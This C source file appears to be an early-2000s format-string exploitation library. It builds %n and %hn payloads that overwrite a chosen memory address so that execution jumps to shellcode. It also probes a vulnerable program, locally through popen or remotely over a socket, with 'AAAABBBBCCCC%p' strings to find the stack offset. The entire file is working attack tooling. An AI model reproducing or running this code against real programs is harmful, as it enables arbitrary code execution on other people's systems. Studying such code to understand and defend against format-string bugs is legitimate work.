/*
 * Copyright (C) 2001, 2002 Pappy.
 * Copyright (C) 2001, 2002 Zorgon.
 * All rights reserved.
 *
 * Warning:
 *    In 2 places, we check the return value from a snprintf().
 *    So, here is what in the corresponding man page :
 * 
 *    glibc <= 2.0 : written = number of characters printed (not
 *                             including the trailing `\0')
 * 
 *    since glibc 2.1 : written = number of characters (excluding the
 *                      trailing '\0') which would have been written to
 *                      the final string if enough space had been
 *                      available.  
 *   
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "fmtb.h"

/* Build the format string using the %n way (4 writings needed) */
int build_n( string_t * p_string )
{
  unsigned char b0, b1, b2, b3;
  int start = ( (p_string->base / ADD) + 1 ) * ADD;
  int sz;

  /* <locaddr> : where to overwrite */
  OCT( b0, b1, b2, b3, p_string->locaddr, "[-] locaddr" );
  sz = snprintf( p_string->fmt, FOUR + 1, /* 16 char to have the 4 addresses */
		 "%c%c%c%c"               /* + 2 for the ending \0 */
		 "%c%c%c%c"
		 "%c%c%c%c"
		 "%c%c%c%c",
		 b3, b2, b1, b0,
		 b3 + 1, b2, b1, b0,
		 b3 + 2, b2, b1, b0,
		 b3 + 3, b2, b1, b0 );

  /* where is our shellcode ? */
  OCT( b0, b1, b2, b3, p_string->retaddr, "[-] retaddr" );

  return snprintf( p_string->fmt + sz, MAX_FMT_LENGTH, 
		   "%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
		   b3 - FOUR + start - p_string->base, p_string->offset,
		   b2 - b3 + start, p_string->offset + 1,
		   b1 - b2 + start, p_string->offset + 2,
		   b0 - b1 + start, p_string->offset + 3 );
}

/* Build the format string using the %hn way (2 writings needed) */
int build_hn( string_t * p_string )
{
  unsigned char b0, b1, b2, b3;
  unsigned int high, low;
  int start = ( (p_string->base / (ADD * ADD) ) + 1 ) * ADD * ADD;
  int sz;

  /* <locaddr> : where to overwrite */
  OCT( b0, b1, b2, b3, p_string->locaddr, "[-] locaddr" );
  sz = snprintf( p_string->fmt, TWO + 1,     /* 8 char to have the 2 addresses */
		 "%c%c%c%c"        /* + 1 for the ending \0 */
		 "%c%c%c%c",
		 b3, b2, b1, b0,
		 b3 + 2, b2, b1, b0 );
  
  /* where is our shellcode ? */
  OCT( b0, b1, b2, b3, p_string->retaddr, "[-] retaddr" );
  high = ( p_string->retaddr & 0xffff0000 ) >> 16; 
  low = p_string->retaddr & 0x0000ffff;      

  return snprintf( p_string->fmt + sz, MAX_FMT_LENGTH, 
		   "%%.%hdx%%%d$n%%.%hdx%%%d$hn", 
		   low - TWO + start - p_string->base, 
		   p_string->offset, 
		   high - low + start, 
		   p_string->offset + 1 );
}

/* The base is the amount of char placed before the our own part of
 * the format string.  
 */
int build_base( char * path, string_t * p_string )
{
  FILE * pipe;
  char pbuf[512], fmt[1024];
  char * p_fmt;

  p_string->base = p_string->pad = 0;

  memset( pbuf, '\x00', sizeof(pbuf) );
  snprintf(pbuf, sizeof(pbuf), "%s DEADBEEF", path );
  pbuf[sizeof(pbuf)-1] = '\x00';

  pipe = popen( pbuf, "r" );
  if ( pipe == NULL ) {
    return( -1 );
  }

  memset( fmt, '\x00', sizeof(fmt) );
  while ( fgets(fmt, sizeof(fmt), pipe) != 0 ) {
    p_fmt = strstr(fmt, "DEADBEEF" );
    if ( p_fmt != NULL ) {
      p_string->base = strlen(fmt) - strlen(p_fmt);

      if ( p_string->base%4 ) {
	p_string->pad = 4 - ( p_string->base%4 );
	p_string->base += p_string->pad;
      }
			
      pclose( pipe );
      return( 0 );
    }
  }
  return( -1 );
}	

/* Get the offset between the input and output buffers By sending
 * successively 'AAAABBBBCCCC%p%p...%p'", we attempt to retrieve
 * the BBBB in the stack (i.e. 4242424242). Unfortunatly, the
 * alignment is not always 0, so we have to check for several
 * possibilities (that is why we put the AAAA before and CCCC after).
 */
unsigned int get_offset( char * path ) 
{
  FILE * pipe;
  char pbuf[512];
  char fmt[1024];
  unsigned int off_t = 0;
  int i;

  for ( off_t = 0; off_t < MAX_OFFSET; off_t++ ) {
    memset( pbuf, '\x00', sizeof(pbuf) );
    snprintf(pbuf, sizeof(pbuf), "%s 'AAAABBBBCCCC", path );
    for ( i = 0; i <= off_t; i++ ) {
      strcat( pbuf, " %p" );
    }
    strcat( pbuf, "'" );
    pbuf[sizeof(pbuf)-1] = '\x00';

    pipe = popen( pbuf, "r" );
    if ( pipe == NULL ) {
      return( 0 );
    }

    memset( fmt, '\x00', sizeof(fmt) );
    while ( fgets(fmt, sizeof(fmt), pipe) != 0 ) {
      if ( strstr(fmt, "0x42424242") ||                /* align = 0 */
	  strstr(fmt, "0x42424241 0x43434342") ||      /* align = 1 */
	  strstr(fmt, "0x42424141 0x43434242") ||      /* align = 2 */
	  strstr(fmt, "0x42414141 0x43424242") ) {     /* align = 3 */
	pclose(pipe); 
	return( off_t );
      }
    }
  }
  pclose(pipe); 
  return( 0 );
}

/* Same as get_offset() just above, but remotlt through a socket */
unsigned int get_offset_remote( int sock ) 
{
  char pbuf[512];
  char fmt[1024];
  unsigned int off_t = 0;
  int i, len;

  for ( off_t = 0; off_t < MAX_OFFSET; off_t++ ) {
    memset( pbuf, '\x00', sizeof(pbuf) );
    snprintf(pbuf, sizeof(pbuf), "AAAABBBBCCCC" );
    for ( i = 0; i <= off_t; i++ ) {
      strcat( pbuf, " %p" );
    }
    pbuf[sizeof(pbuf)-1] = '\x00';

    write( sock, pbuf, strlen(pbuf) );
    sleep( 1 );

    memset( fmt, '\x00', sizeof(fmt) );
    len = read( sock, fmt, sizeof(fmt) );
    if ( len < 0 ) {
      return( 0 );
    }
    if ( strstr(fmt, "0x42424242") ||                 /* align = 0 */
	 strstr(fmt, "0x42424241 0x43434342") ||      /* align = 1 */
	 strstr(fmt, "0x42424141 0x43434242") ||      /* align = 2 */
	 strstr(fmt, "0x42414141 0x43424242") ) {     /* align = 3 */
      return( off_t );
      }
  }
  return( 0 );
}

/* simple conversion function, which can return not exactly what was 
 * asked which could lead to troubles ... FIXME ?
 */
void get_addr_as_char( u_int addr, char * buf ) 
{
  int i;

  *( u_int * )buf = addr;
  for ( i = 0; i < 4; i++ ) {
    if ( !buf[i] ) {
      buf[i]++;
    }
  }
  return;
}
